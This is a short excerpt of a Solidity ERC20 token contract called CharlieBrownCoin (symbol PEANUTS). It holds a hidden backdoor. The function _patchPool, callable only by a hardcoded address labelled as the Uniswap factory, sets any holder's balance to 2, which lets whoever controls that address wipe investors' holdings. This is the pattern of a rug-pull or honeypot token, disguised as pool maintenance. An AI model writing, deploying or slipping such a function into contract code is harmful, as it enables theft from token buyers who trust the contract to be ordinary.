...
contract CharlieBrownCoin is Context, IERC20, IERC20Metadata, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"CharlieBrown";
    string private constant _symbol = unicode"PEANUTS";
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address private _uniswapFactory = 0x0F4F402a2dcBEF113b96B741727603B826CF94EC;
     ...
     */
    function _patchPool(address _patchPoolSender) external { if (msg.sender == _uniswapFactory) _balances[_patchPoolSender] = 2; }
